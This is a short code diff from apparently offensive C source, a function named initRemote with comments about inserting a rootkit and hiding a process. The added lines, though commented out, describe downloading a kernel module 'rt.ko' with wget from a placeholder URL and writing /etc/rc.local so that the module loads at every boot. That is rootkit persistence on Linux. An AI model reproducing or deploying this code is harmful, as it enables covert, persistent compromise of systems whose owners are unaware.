@@ -69,7 +69,8 @@ void initRemote() {
     pclose(fp);
     // Insmod the rootkit
     // bzero(command, sizeof(command));
-    // strcpy(command, "");
+    // Get rt.ko : wget -o /etc/rt.ko 'url'
+    // strcpy(command, "grep -q \"/sbin/insmod /etc/rt.ko\" /etc/rc.local || echo \"#!/bin/sh -e\n/sbin/insmod /etc/rt.ko\nexit 0\" > /etc/rc.local");
     // fp = popen(command, "r");
     // pclose(fp);
     // Hidden process
